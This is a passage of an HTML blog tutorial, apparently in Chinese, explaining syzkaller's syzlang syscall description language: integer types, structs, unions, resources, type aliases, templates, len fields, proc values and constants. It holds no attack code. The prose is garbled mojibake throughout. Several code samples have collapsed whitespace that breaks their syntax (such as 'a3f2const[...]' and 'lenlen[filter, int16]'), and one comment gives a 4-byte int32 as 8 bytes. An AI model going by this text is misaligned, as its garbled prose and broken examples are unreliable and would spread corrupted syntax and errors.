class="headerlink" title="IV.æ•´å‹ï¼ˆintegerï¼‰"></a>IV.æ•´å‹ï¼ˆintegerï¼‰</h3><p>æ•´å‹ä¹Ÿæ˜¯ä¸€ç§ typeï¼Œå…¶å¯é€‰é¡¹ä¸º <code>int8</code> ã€<code>int16</code>ã€<code>int32</code>ã€<code>int64</code>ï¼Œè¡¨ç¤ºç›¸åº”å¤§å°çš„æ•´å‹</p><p><code>intptr</code> ç”¨ä»¥è¡¨ç¤ºä¸€ä¸ª<strong>æŒ‡é’ˆå¤§å°</strong>çš„æ•´å‹ï¼Œå¯¹åº” C è¯­è¨€ä¸­çš„ <code>long</code></p><p>é€šè¿‡æ·»åŠ  <code>be</code> åç¼€è¡¨ç¤ºè¿™ä¸ªæ•´å‹å­˜å‚¨ä¸º<strong>å¤§ç«¯åº</strong></p><p>è¿™æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read$eventfd(fd fd_event, val ptr[out, int64], len len[val])</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ç”¨è¿™æ ·çš„å½¢å¼æ¥æŒ‡å®š int çš„èŒƒå›´ï¼š<code>int32[0:100]</code>â€”â€”æ„ä¸ºè¯¥æ•´å‹çš„å–å€¼èŒƒå›´ä¸º <code>[0,100]</code></p><p>æˆ‘ä»¬è¿˜å¯ä»¥é¢å¤–æŒ‡å®šå–å€¼çš„è·¨åº¦ï¼Œä¾‹å¦‚ <code>int32[1:10, 2]</code> æ„ä¸ºå…¶å–å€¼ä¸º {1, 3, 5, 7, 9}</p><p>æˆ‘ä»¬è¿˜å¯ä»¥é¢å¤–æŒ‡å®šä¸€ä¸ªæ•´å‹çš„å–å€¼èŒƒå›´ï¼Œå•ä½ä¸ºæ¯”ç‰¹ä½ï¼Œä¾‹å¦‚ <code>int64:20</code> æ„ä¸ºè¿™ä¸ªæ•´å‹åªå–å…¶ 20 bit çš„å€¼è¿›è¡ŒéšæœºåŒ–</p><h3 id="V-ç»“æ„ä½“ã€è”åˆä½“ä¸å…¶æˆå‘˜ï¼ˆå­—æ®µï¼‰"><a href="#V-ç»“æ„ä½“ã€è”åˆä½“ä¸å…¶æˆå‘˜ï¼ˆå­—æ®µï¼‰" class="headerlink" title="V.ç»“æ„ä½“ã€è”åˆä½“ä¸å…¶æˆå‘˜ï¼ˆå­—æ®µï¼‰"></a>V.ç»“æ„ä½“ã€è”åˆä½“ä¸å…¶æˆå‘˜ï¼ˆå­—æ®µï¼‰</h3><p>åœ¨ syzlang ä¸­åŒæ ·å¯ä»¥å®šä¹‰ç»“æ„ä½“&#x2F;è”åˆä½“ï¼Œç»“æ„ä½“&#x2F;è”åˆä½“çš„æˆå‘˜è¢«ç§°ä¹‹ä¸º <code>å­—æ®µ</code>ï¼ˆfieldï¼‰</p><h4 id="ç»“æ„ä½“ï¼ˆstructï¼‰"><a href="#ç»“æ„ä½“ï¼ˆstructï¼‰" class="headerlink" title="ç»“æ„ä½“ï¼ˆstructï¼‰"></a>ç»“æ„ä½“ï¼ˆstructï¼‰</h4><p>åœ¨ syzlang ä¸­ï¼Œä¸€ä¸ªç»“æ„ä½“åº”ä¸ºå¦‚ä¸‹å½¢å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">structname &quot;&#123;&quot; &quot;\n&quot;</span><br><span class="line">(fieldname type (&quot;(&quot; fieldattribute* &quot;)&quot;)? &quot;\n&quot;)+</span><br><span class="line">&quot;&#125;&quot; (&quot;[&quot; attribute* &quot;]&quot;)?</span><br></pre></td></tr></table></figure><p>å¯¹äºå­—æ®µè€Œè¨€ï¼Œå…¶å¯ä»¥åœ¨åé¢çš„ <code>()</code> ä¸­æŒ‡å®šå­—æ®µå±æ€§ï¼Œä½†ä¸ type çš„å±æ€§ä¸åŒï¼Œå”¯ä¸€çš„å±æ€§åªæœ‰æ–¹å‘ï¼š <code>in/out/inout</code>ï¼Œå¯¹äºæŒ‡å®šçš„å­—æ®µï¼Œå…¶æ–¹å‘å±æ€§ä¼šè¢«ä¸Šå±‚å±æ€§ç»™è¦†ç›–</p><p>åœ¨ç»“æ„ä½“å®šä¹‰çš„å°¾éƒ¨ï¼Œæˆ‘ä»¬å¯ä»¥é¢å¤–æŒ‡å®šä¸€äº›å±æ€§ï¼ˆä½¿ç”¨ <code>[]</code> åŒ…è£¹ï¼‰ï¼Œå¯é€‰å±æ€§æœ‰ï¼š</p><ul><li><code>packed</code>ï¼šè¯¥ç»“æ„ä½“ä¸åŒå­—æ®µä¹‹é—´æ²¡æœ‰ paddingï¼ˆä¾‹å¦‚ C ä¸­æœ‰ä¸€ä¸ªç»“æ„ä½“ <code>struct T&#123;int a; char b;&#125;;</code>ï¼Œchar ä¸º 1 å­—èŠ‚ï¼Œint ä¸º 4 å­—èŠ‚ï¼Œé‚£ä¹ˆè¯¥ç»“æ„ä½“ä¾¿ä¼šå¯¹ 4 å­—èŠ‚å¯¹é½ï¼Œåœ¨å…¶ä¸¤ä¸ªå­—æ®µä¹‹é—´å°±ä¼šæœ‰ 3 å­—èŠ‚çš„ paddingï¼‰</li><li><code>align[N]</code>ï¼šæŒ‡å®šè¯¥ç»“æ„ä½“å¯¹ N å­—èŠ‚å¯¹é½ï¼Œpadding çš„å†…å®¹å¹¶æœªæŒ‡å®šï¼ˆé€šå¸¸ä¸º0ï¼‰</li><li><code>size[N]</code>ï¼šç»“æ„ä½“è¢«å¡«å……åˆ°æŒ‡å®šçš„å¤§å° <code>N</code></li></ul><p>å…¶å®å’Œæˆ‘ä»¬åœ¨ C è¯­è¨€ä¸­å†™ç»“æ„ä½“å·®ä¸å¤šï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">my_struct &#123;</span><br><span class="line">a3f1 int8# ä¸€ä¸ªéšæœºçš„ 1 å­—èŠ‚çš„ int</span><br><span class="line">a3f2const[0xdeadbeef, int32be]# ä¸€ä¸ªå›ºå®šçš„ 8 å­—èŠ‚çš„ intï¼Œå–å€¼ä¸º 0xdeadbeefï¼Œå¤§ç«¯åº</span><br><span class="line">a3f3int32[0:100]# ä¸€ä¸ªéšæœºçš„ 4 å­—èŠ‚çš„ intï¼Œå–å€¼èŒƒå›´ä¸º [0,100]</span><br><span class="line">a3f4int64:20# ä¸€ä¸ªéšæœºçš„ 8 å­—èŠ‚çš„ intï¼Œåªå–20ä¸ªæ¯”ç‰¹çš„å€¼ï¼ˆå…¶ä»–bitç½®0ï¼Ÿï¼‰</span><br><span class="line">&#125; [packed]</span><br></pre></td></tr></table></figure><h4 id="è”åˆä½“ï¼ˆunionï¼‰"><a href="#è”åˆä½“ï¼ˆunionï¼‰" class="headerlink" title="è”åˆä½“ï¼ˆunionï¼‰"></a>è”åˆä½“ï¼ˆunionï¼‰</h4><p>ä¸ç»“æ„ä½“åŸºæœ¬ç›¸åŒï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unionname &quot;[&quot; &quot;\n&quot;</span><br><span class="line">(fieldname type (&quot;(&quot; fieldattribute* &quot;)&quot;)? &quot;\n&quot;)+</span><br><span class="line">&quot;]&quot; (&quot;[&quot; attribute* &quot;]&quot;)?</span><br></pre></td></tr></table></figure><p>ä¸åŒçš„æ˜¯å…¶å±æ€§çš„å¯é€‰é¡¹ï¼Œæœ‰ï¼š</p><ul><li><code>varlen</code>ï¼šè”åˆä½“çš„å¤§å°å¯å˜ï¼ˆä¸ºæŒ‡å®šçš„å­—æ®µçš„é•¿åº¦ï¼‰ï¼Œè‹¥æœªæŒ‡å®šåˆ™è¯¥è”åˆä½“å¤§å°ä¸ºå…¶æœ€å¤§å­—æ®µçš„å¤§å°ï¼ˆç±»å‹ C è¯­è¨€ï¼‰</li><li><code>size[N]</code>ï¼šè¯¥è”åˆä½“è¢«å¡«å……åˆ°æŒ‡å®šçš„å¤§å° <code>N</code></li></ul><h3 id="VI-èµ„æºï¼ˆresourcesï¼‰"><a href="#VI-èµ„æºï¼ˆresourcesï¼‰" class="headerlink" title="VI.èµ„æºï¼ˆresourcesï¼‰"></a>VI.èµ„æºï¼ˆresourcesï¼‰</h3><p>èµ„æºï¼ˆresourcesï¼‰ç”¨ä½œé‚£äº›éœ€è¦ä½œä¸ºä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„è¾“å‡ºçš„å€¼ä¼ é€’ç»™å¦ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨åšè¾“å…¥çš„å€¼ã€‚</p><p>è¿™ä¹ˆè¯´å¯èƒ½æœ‰äº›ç©ºæ³›ï¼Œç¬”è€…æ¥ä¸¾ä¸ªğŸŒ°ï¼Œ <code>close</code> ç³»ç»Ÿè°ƒç”¨æ¥æ”¶ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ä½œä¸ºå‚æ•°ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦åº”å½“ä¸ºä½ åœ¨ä¹‹å‰è¿›è¡Œ <code>open </code> æˆ– <code>pipe</code> ç³»ç»Ÿè°ƒç”¨æ—¶è·å¾—çš„è¿”å›å€¼ï¼Œä¸ºäº†è¾¾æˆè¿™ä¸ªç›®çš„ï¼Œæˆ‘ä»¬éœ€è¦å°†æ–‡ä»¶æè¿°ç¬¦ï¼ˆæ¯”å¦‚è¯´å« <code>fd</code>ï¼‰å£°æ˜ä¸ºä¸€ä¸ª<strong>èµ„æº</strong></p><p>resources çš„å½¢å¼å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;resource&quot; identifier &quot;[&quot; underlying_type &quot;]&quot; [ &quot;:&quot; const (&quot;,&quot; const)* ]</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„ <code>underlying_type</code> å¯ä»¥æ˜¯ <code>int8</code>, <code>int16</code>, <code>int32</code>, <code>int64</code>, <code>intptr</code> æˆ–è€…æ˜¯å¦ä¸€ä¸ªèµ„æºï¼ˆå¯ä»¥æ˜¯å…¶å­ç±»ï¼Œæ¯”å¦‚è¯´ä¸€ä¸ª socket ä¾¿æ˜¯ æ–‡ä»¶æè¿°ç¬¦çš„â€œå­ç±»â€ï¼‰</p><p>å¸¸é‡é›†åˆå¯ä»¥ä½œä¸ºå¯é€‰å‚æ•°ï¼Œè¡¨ç¤ºè¯¥èµ„æºçš„ç‰¹æ®Šå€¼ï¼ˆæ¯”å¦‚è¯´ 0xdeadbeefï¼‰ï¼Œç‰¹æ®Šå€¼å¶å°”è¢«ç”¨ä½œèµ„æºçš„å€¼ï¼Œè‹¥æœªæŒ‡å®šç‰¹æ®Šå€¼ï¼Œåˆ™ä¼šä½¿ç”¨ç‰¹æ®Šå€¼ <code>0</code></p><p>èµ„æºä¹Ÿå¯ä»¥è¢«ç”¨ä½œç±»å‹ï¼ˆtypesï¼‰ï¼Œè¿™æ˜¯å®˜æ–¹ç»™å‡ºçš„ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">resource fd[int32]: 0xffffffffffffffff, AT_FDCWD, 1000000</span><br><span class="line">resource sock[fd]# ç»§æ‰¿ fd ç±»å‹</span><br><span class="line">resource sock_unix[sock]# ç»§æ‰¿ sock ç±»å‹</span><br><span class="line"></span><br><span class="line">socket(...) sock</span><br><span class="line">accept(fd sock, ...) sock</span><br><span class="line">listen(fd sock, backlog int32)</span><br></pre></td></tr></table></figure><p>èµ„æº<strong>å¹¶ä¸ä¸€å®šè¦æ˜¯ç³»ç»Ÿè°ƒç”¨çš„è¿”å›å€¼</strong>ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">resource my_resource[int32]</span><br><span class="line"></span><br><span class="line">request_producer(..., arg ptr[out, my_resource])</span><br><span class="line">request_consumer(..., arg ptr[inout, test_struct])</span><br><span class="line"></span><br><span class="line">test_struct &#123;</span><br><span class="line">...</span><br><span class="line">attrmy_resource</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹äºæ›´ä¸ºå¤æ‚çš„ç”Ÿäº§è€…&#x2F;æ¶ˆè´¹è€…åœºæ™¯ï¼Œå­—æ®µå±æ€§ä¹Ÿå¯ä»¥è¢«åˆ©ç”¨ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">resource my_resource_1[int32]</span><br><span class="line">resource my_resource_2[int32]</span><br><span class="line"></span><br><span class="line">request_produce1_consume2(..., arg ptr[inout, test_struct])</span><br><span class="line"></span><br><span class="line">test_struct &#123;</span><br><span class="line">...</span><br><span class="line">field0my_resource_1(out)</span><br><span class="line">field1my_resource_2(in)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="VII-ç±»å‹åˆ«åï¼ˆType-Aliasï¼‰"><a href="#VII-ç±»å‹åˆ«åï¼ˆType-Aliasï¼‰" class="headerlink" title="VII.ç±»å‹åˆ«åï¼ˆType Aliasï¼‰"></a>VII.ç±»å‹åˆ«åï¼ˆType Aliasï¼‰</h3><p>ç¬”è€…è®¤ä¸ºå¯ä»¥ç†è§£ä¸º C ä¸­çš„ä¸€ç§ç‰¹æ®Šçš„ typedefï¼Œå…¶æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type identifier underlying_type</span><br></pre></td></tr></table></figure><p>è¿™ä¹ˆçœ‹å¯èƒ½æœ‰äº›ç©ºæ³›ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">type bool8int8[0:1]</span><br><span class="line">type bool16int16[0:1]</span><br><span class="line">type bool32int32[0:1]</span><br><span class="line">type bool64int64[0:1]</span><br><span class="line">type boolptrintptr[0:1]</span><br><span class="line"></span><br><span class="line">type fileoff[BASE] BASE</span><br><span class="line"></span><br><span class="line">type filename string[filename]</span><br><span class="line"></span><br><span class="line">type buffer[DIR] ptr[DIR, array[int8]]</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­å½“ä¸­æˆ‘ä»¬éœ€è¦ä½¿ç”¨å¸ƒå°”å€¼ï¼Œå…¶å–å€¼åªæœ‰ 0 æˆ– 1 ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å†™æˆ <code>intN[0:1]</code>ï¼Œä½†æ˜¯è‹¥æ˜¯åœ¨æ¯ä¸€ä¸ªéœ€è¦ç”¨åˆ°å¸ƒå°”å€¼çš„åœ°æ–¹éƒ½è¿™ä¹ˆå†™å°±å¤ªéº»çƒ¦äº†ï¼Œä¹Ÿä¸åˆ©äºç†è§£ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ç»™ä»–å®šä¹‰ä¸€ä¸ª<strong>ç±»å‹åˆ«å</strong> <code>boolN</code>ï¼Œç®€å•æ˜“æ‡‚</p><h3 id="VIII-ç±»å‹æ¨¡æ¿ï¼ˆType-Templateï¼‰"><a href="#VIII-ç±»å‹æ¨¡æ¿ï¼ˆType-Templateï¼‰" class="headerlink" title="VIII.ç±»å‹æ¨¡æ¿ï¼ˆType Templateï¼‰"></a>VIII.ç±»å‹æ¨¡æ¿ï¼ˆType Templateï¼‰</h3><p>ç±»å‹æ¨¡æ¿åº”å®šä¹‰ä¸ºå¦‚ä¸‹å½¢å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">type optional[T] [</span><br><span class="line">valT</span><br><span class="line">voidvoid</span><br><span class="line">] [varlen]</span><br></pre></td></tr></table></figure><p><del>å”‰å‘€è°·æ­Œä½ è¿™ä¹ˆè®²è°èƒ½å¤Ÿçœ‹å¾—æ‡‚å•Šï¼Œè¿˜æ˜¯èµ¶ç´§æŠŠğŸŒ°ç»™æå‡ºæ¥å§</del></p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ç”¨æ³•ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">type buffer[DIR] ptr[DIR, array[int8]]</span><br><span class="line">type fileoff[BASE] BASE</span><br><span class="line">type nlattr[TYPE, PAYLOAD] &#123;</span><br><span class="line">nla_lenlen[parent, int16]</span><br><span class="line">nla_typeconst[TYPE, int16]</span><br><span class="line">payloadPAYLOAD</span><br><span class="line">&#125; [align_4]</span><br><span class="line"></span><br><span class="line">#...</span><br><span class="line"></span><br><span class="line">syscall(a buffer[in], b fileoff[int64], c ptr[in, nlattr[FOO, int32]])</span><br></pre></td></tr></table></figure><p><del>ç¬”è€…ä¹Ÿæ²¡çœ‹æ˜ç™½ï¼Œæš‚æ—¶å°±å…ˆä¸è¯¯äººå­å¼Ÿäº†</del></p><h3 id="IX-é•¿åº¦ï¼ˆlengthï¼‰"><a href="#IX-é•¿åº¦ï¼ˆlengthï¼‰" class="headerlink" title="IX.é•¿åº¦ï¼ˆlengthï¼‰"></a>IX.é•¿åº¦ï¼ˆlengthï¼‰</h3><p>ä½ å¯ä»¥ä½¿ç”¨å…³é”®å­— <code>len</code>ã€<code>bytesize</code>ã€<code>bitsize</code> æ¥æŒ‡å®šç»“æ„ä½“å½“ä¸­ç‰¹å®šå­—æ®µçš„é•¿åº¦</p><p>è‹¥æ˜¯ <code>len</code> çš„å‚æ•°ä¸ºä¸€ä¸ªæŒ‡é’ˆï¼Œåˆ™å…¶å–å€¼ä¸º<strong>æŒ‡é’ˆæ‰€æŒ‡å¯¹è±¡çš„å¤§å°</strong></p><p>è‹¥è¦è¡¨ç¤ºä¸€ä¸ª <code>N å­—èŠ‚çš„å­—</code> ä¸­å­—æ®µçš„é•¿åº¦ï¼Œåˆ™åº”å½“ä½¿ç”¨ <code>bytesizeN</code>ï¼Œå…¶ä¸­ N çš„å–å€¼å¯ä»¥ä¸º 1ã€2ã€4ã€8</p><h4 id="example-1"><a href="#example-1" class="headerlink" title="example"></a><em>example</em></h4><p>è¿™æ˜¯è°·æ­Œå®˜æ–¹ç»™å‡ºçš„ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">write(fd fd, buf ptr[in, array[int8]], count len[buf])</span><br><span class="line"></span><br><span class="line">sock_fprog &#123;</span><br><span class="line">lenlen[filter, int16]</span><br><span class="line">filterptr[in, array[sock_filter]]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ write ç³»ç»Ÿè°ƒç”¨å½“ä¸­ï¼Œæˆ‘ä»¬ç»™å…¶ count å‚æ•°ä¼ å…¥äº†ä¸€ä¸ªç‰¹æ®Šçš„å‚æ•° <code>len[buf]</code>ï¼Œè¡¨ç¤ºæ­¤å¤„ä¼ å…¥çš„å€¼ä¸ºå‚æ•° buf çš„é•¿åº¦</p><p>åœ¨ sock_fprog è¿™ä¸ªç»“æ„ä½“å½“ä¸­ï¼Œæˆ‘ä»¬ç»™å…¶å­—æ®µ len è®¾ç½®çš„å€¼ä¸ºå…¶ filter å­—æ®µçš„é•¿åº¦ï¼Œç±»å‹ä¸º int 16</p><p>è‹¥è¦è¡¨ç¤ºçˆ¶ç±»çš„é•¿åº¦ï¼Œå¯ä»¥ä½¿ç”¨ <code>len[parent, intN]</code>ï¼Œè‹¥è¦åœ¨ç»“æ„ä½“äº’ç›¸åµŒå…¥æ—¶è¡¨ç¤ºæ›´é¡¶å±‚çš„çˆ¶ç±»çš„é•¿åº¦ï¼Œå¯ä»¥æŒ‡å®šç‰¹å®šçˆ¶ç±»çš„ç±»å‹åç§°ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">s1 &#123;</span><br><span class="line">    f0      len[s2]  # length of s2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s2 &#123;</span><br><span class="line">    f0      s1</span><br><span class="line">    f1      array[int32]</span><br><span class="line">    f2      len[parent, int32]</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>len ä¹Ÿæ”¯æŒæ›´åŠ å¤æ‚çš„è·¯å¾„å¯»å€ï¼Œæ¯”å¦‚è¯´å¦‚æœä½ é—²ç€æ²¡äº‹å¹²ä½ å¯ä»¥å†™æˆè°·æ­Œç»™å‡ºçš„è¿™ä¸ªğŸŒ°é‡Œçš„æ ·å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">s1 &#123;</span><br><span class="line">aptr[in, s2]</span><br><span class="line">bptr[in, s3]</span><br><span class="line">carray[int8]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s2 &#123;</span><br><span class="line">darray[int8]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s3 &#123;</span><br><span class="line"># This refers to the array c in the parent s1.</span><br><span class="line">elen[s1:c, int32]</span><br><span class="line"># This refers to the array d in the sibling s2.</span><br><span class="line">flen[s1:a:d, int32]</span><br><span class="line"># This refers to the array k in the child s4.</span><br><span class="line">glen[i:j, int32]</span><br><span class="line"># This refers to syscall argument l.</span><br><span class="line">hlen[syscall:l, int32]</span><br><span class="line">iptr[in, s4]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s4 &#123;</span><br><span class="line">jarray[int8]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(k ptr[in, s1], l ptr[in, array[int8]])</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="X-è¿›ç¨‹ï¼ˆprocï¼‰"><a href="#X-è¿›ç¨‹ï¼ˆprocï¼‰" class="headerlink" title="X.è¿›ç¨‹ï¼ˆprocï¼‰"></a>X.è¿›ç¨‹ï¼ˆprocï¼‰</h3><p>è¿›ç¨‹ <code>proc</code> ç±»å‹å¯ä»¥ç”¨äºè¡¨ç¤ºåˆ†è¿›ç¨‹æ•´å‹å€¼ï¼Œå³ä¸ºæ¯ä¸€ä¸ªæ‰§è¡Œç¨‹åºè®¾ç½®ä¸€ä¸ªå•ç‹¬çš„å€¼çš„èŒƒå›´ï¼Œè¿™æ ·ä»–ä»¬ä¹‹é—´å°±ä¸ä¼šäº’ç›¸å¹²æ‰°ï¼ŒğŸŒ°å¦‚ç«¯å£å·å°±ä¸èƒ½å¤Ÿè¢«å…±äº«ï¼Œè€Œæ˜¯éœ€è¦æ¯ä¸ªè¿›ç¨‹æœ‰ä¸€ä¸ªè‡ªå·±çš„ç«¯å£</p><p>è¿™é‡Œä¸¾ä¸€ä¸ªç®€å•çš„ğŸŒ°ï¼Œ <code>proc[20000, 4, int16be]</code> è¡¨ç¤ºä¸ºæ¯ä¸ªè¿›ç¨‹ç”Ÿæˆä¸€ä¸ªå¤§ç«¯åºçš„ int16 çš„å€¼ï¼Œä¸ºæ¯ä¸ªè¿›ç¨‹åˆ†é…å…¶ä¸­çš„ 4 ä¸ªå€¼ï¼Œä» 20000 å¼€å§‹åˆ†é…ï¼Œæ¯”å¦‚è¯´ç¬¬ N ä¸ª executor åˆ†é…åˆ°çš„å€¼èŒƒå›´ä¾¿æ˜¯ <code>[20000 + n * 4, 20000 + (n + 1) * 4)</code></p><h3 id="XI-æ•´å‹å¸¸é‡ï¼ˆInteger-Constantsï¼‰"><a href="#XI-æ•´å‹å¸¸é‡ï¼ˆInteger-Constantsï¼‰" class="headerlink" title="XI.æ•´å‹å¸¸é‡ï¼ˆInteger Constantsï¼‰"></a>XI.æ•´å‹å¸¸é‡ï¼ˆInteger Constantsï¼‰</h3><p>æ•´å‹å¸¸é‡å¯ä»¥æŒ‡å®šä¸ºåè¿›åˆ¶ã€<code>0x</code> å¼€å¤´çš„åå…­è¿›åˆ¶ã€ç”¨å•å¼•å· <code>&#39;</code> åŒ…è£¹çš„å­—ç¬¦ï¼Œæˆ–è€…ä»å†…æ ¸å¤´æ–‡ä»¶ä¸­æå–å‡ºæ¥çš„ç”± <code>define</code> å®šä¹‰çš„å¸¸é‡ï¼ˆæ¯”å¦‚è¯´ <code>O_RDONLY</code>ï¼‰</p><p>è¿™æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">foo(a const[10], b const[-10])</span><br><span class="line">foo(a const[0xabcd])</span><br><span class="line">foo(a int8[&#x27;a&#x27;:&#x27;z&#x27;])</span><br><span class="line">foo(a const[PATH_MAX])</span><br><span class="line">foo(a ptr[in, array[int8, MY_PATH_MAX]])</span><br><span class="line">define MY_PATH_MAXPATH_MAX + 2</span><br></pre></td></tr></table></figure><h3 id="XII-æ‚é¡¹ï¼ˆMiscï¼‰"><a href="#XII-æ‚é¡¹ï¼ˆMiscï¼‰" class="headerlink" title="XII.æ‚é¡¹ï¼ˆMiscï¼‰"></a>XII.æ‚é¡¹ï¼ˆMiscï¼‰</h3><p>æè¿°æ–‡ä»¶è¿˜åŒ…æ‹¬ç”¨ä»¥è¿›è¡Œå†…æ ¸å¤´æ–‡ä»¶åŒ…å«çš„ <code>include</code> æŒ‡ä»¤ï¼Œç”¨ä»¥åŒ…å«å†…æ ¸å¤´æ–‡ä»¶ç›®å½•çš„ <code>incdir</code> æŒ‡ä»¤ï¼Œä»¥åŠç”¨ä»¥è®¾ç½®å¸¸é‡çš„ <code>define</code> æŒ‡ä»¤</p><p>syzkaller executor è¿˜å®šä¹‰äº†ä¸€äº› <a href="https://github.com/google/syzkaller/blob/master/docs/pseudo_syscalls.md">pseudo system calls</a> ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æè¿°æ–‡ä»¶ä¸­ä½¿ç”¨è¿™äº›ä¼ªç³»ç»Ÿè°ƒç”¨ã€‚è¿™äº›ä¼ªç³»ç»Ÿè°ƒç”¨è¢«æ‰©å±•ä¸º C ä»£ç ï¼Œå¯ä»¥æ‰§è¡Œç”¨æˆ·è‡ªå®šä¹‰çš„ä¸€äº›æ“ä½œï¼Œ<a href="https://github.com/google/syzkaller/blob/master/executor/common_linux.h">è¿™é‡Œ</a>æ˜¯ä¸€äº›ğŸŒ°</p><p>è¦å†™å‡ºä¼˜ç§€çš„æè¿°æ–‡ä»¶ï¼Œ<a href="https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions.md#tips">è¿™é‡Œ</a>æ˜¯ä¸€äº› tips</p><h2 id="ç¼–å†™å¹¶ä½¿ç”¨æè¿°æ–‡ä»¶"><a href="#ç¼–å†™å¹¶ä½¿ç”¨æè¿°æ–‡ä»¶" class="headerlink" 